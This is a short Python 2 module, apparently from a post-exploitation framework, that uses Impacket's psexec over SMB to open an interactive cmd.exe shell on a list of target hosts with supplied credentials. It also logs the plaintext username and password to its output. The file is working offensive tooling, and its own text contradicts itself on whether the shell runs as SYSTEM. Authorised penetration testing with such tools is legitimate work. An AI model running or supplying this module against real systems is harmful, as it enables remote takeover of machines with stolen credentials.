"""

Execute impacket's psexec shell on a partiular host.

This creates a fully-interactice shell running as SYSTEM.

All cred to the the awesome Impacket project !
    https://code.google.com/p/impacket/


Module built by @harmj0y

"""

from lib import helpers
from lib import impacket_psexec

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Psexec Shell"
        self.description = ("Execute Impacket's psexec.py module to create a "
                            "fully-interactive shell on a target without "
                            "running as system.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

    def run(self):
        
        # assume single set of credentials for this module
        username, password = self.creds[0]

        # see if we need to extract a domain from "domain\username"
        domain = ""
        if "/" in username:
            domain,username = username.split("/")

        executer = impacket_psexec.PSEXEC('cmd.exe', "", None, "445/SMB", username, password, domain, None)
        print "\n\n [*] Type "+helpers.color("'exit'") + " to exit the shell\n"

        for target in self.targets:
            executer.run(target)
            self.output += "[*] Impacket psexec.py shell run using creds '"+username+":"+password+"' on "+target+"\n"

